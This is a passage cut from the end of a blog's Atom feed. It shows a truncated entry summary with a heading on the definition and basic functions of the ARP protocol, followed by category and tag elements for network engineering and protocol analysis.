&lt;h3 id=&quot;ARP的定义与基本功能&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
